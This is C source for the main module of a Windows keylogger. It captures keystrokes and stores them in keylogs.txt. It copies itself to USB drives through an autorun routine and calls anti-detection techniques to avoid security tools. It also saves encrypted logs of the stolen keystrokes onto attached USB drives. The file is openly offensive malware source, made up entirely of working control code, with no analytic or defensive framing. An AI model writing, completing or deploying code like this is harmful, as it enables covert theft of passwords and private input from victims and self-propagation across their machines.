#include "keylogger_system.h"
#include "keylogger.h"
#include "key_logger_storage.h"
#include "usb_autorun.h"
#include "anti_detection.h"
#include "utils.h"
#include <windows.h>
#include <stdio.h>
#include <time.h>

#define USB_CHECK_INTERVAL 60
#define LOG_FLUSH_INTERVAL 300

struct KeyloggerSystem {
    Keylogger* keylogger;
    KeyLoggerStorage* storage;
    USBAutorun* usb_autorun;
    bool is_running;
    time_t last_usb_check;
    time_t last_log_flush;
};

static void log_error(const char* message) {
}

KeyloggerSystem* keylogger_system_create(void) {
    KeyloggerSystem* system = safe_malloc(sizeof(KeyloggerSystem));
    if (system) {
        system->keylogger = NULL;
        system->storage = NULL;
        system->usb_autorun = NULL;
        system->is_running = false;
        system->last_usb_check = 0;
        system->last_log_flush = 0;
    }
    return system;
}

void keylogger_system_destroy(KeyloggerSystem* system) {
    if (system) {
        keylogger_destroy(system->keylogger);
        key_logger_storage_destroy(system->storage);
        usb_autorun_destroy(system->usb_autorun);
        safe_free(system);
    }
}

bool keylogger_system_initialize(KeyloggerSystem* system) {
    if (!system) return false;

    system->keylogger = keylogger_create();
    system->storage = key_logger_storage_create();
    system->usb_autorun = usb_autorun_create();

    if (!system->keylogger || !system->storage || !system->usb_autorun) {
        log_error("Failed to create keylogger system components");
        return false;
    }

    char exe_path[MAX_PATH];
    if (GetModuleFileNameA(NULL, exe_path, MAX_PATH) == 0) {
        log_error("Failed to get executable path");
        return false;
    }
    if (!usb_autorun_setup(system->usb_autorun, exe_path)) {
        log_error("Failed to set up USB autorun");
        return false;
    }

    apply_anti_detection_techniques();

    return true;
}

static void process_keylog(KeyloggerSystem* system) {
    char* logged_keys = keylogger_get_logged_keys(system->keylogger);
    if (logged_keys) {
        if (!key_logger_storage_add_key(system->storage, logged_keys)) {
            log_error("Failed to add keys to storage");
        }
        safe_free(logged_keys);
    }
}

static void check_and_deploy_usb(KeyloggerSystem* system) {
    time_t current_time = time(NULL);
    if (current_time - system->last_usb_check >= USB_CHECK_INTERVAL) {
        if (usb_autorun_detect_usb(system->usb_autorun)) {
            if (!usb_autorun_deploy(system->usb_autorun)) {
                log_error("Failed to deploy to USB");
            }
        }
        system->last_usb_check = current_time;
    }
}

static void flush_logs(KeyloggerSystem* system) {
    time_t current_time = time(NULL);
    if (current_time - system->last_log_flush >= LOG_FLUSH_INTERVAL) {
        if (!key_logger_storage_flush_to_file(system->storage, "keylogs.txt")) {
            log_error("Failed to flush logs to file");
        }
        if (usb_autorun_detect_usb(system->usb_autorun)) {
            const char* usb_drive = usb_autorun_get_usb_drive(system->usb_autorun);
            if (usb_drive && !key_logger_storage_encrypt_and_save_to_usb(system->storage, usb_drive)) {
                log_error("Failed to save encrypted logs to USB");
            }
        }
        system->last_log_flush = current_time;
    }
}

bool keylogger_system_run(KeyloggerSystem* system) {
    if (!system) return false;

    system->is_running = true;
    keylogger_start(system->keylogger);

    while (system->is_running) {
        process_keylog(system);
        check_and_deploy_usb(system);
        flush_logs(system);
        Sleep(100);
    }

    return true;
}

void keylogger_system_shutdown(KeyloggerSystem* system) {
    if (system) {
        system->is_running = false;
        keylogger_stop(system->keylogger);
        
        key_logger_storage_flush_to_file(system->storage, "keylogs.txt");
        if (usb_autorun_detect_usb(system->usb_autorun)) {
            const char* usb_drive = usb_autorun_get_usb_drive(system->usb_autorun);
            if (usb_drive) {
                key_logger_storage_encrypt_and_save_to_usb(system->storage, usb_drive);
            }
        }
    }
}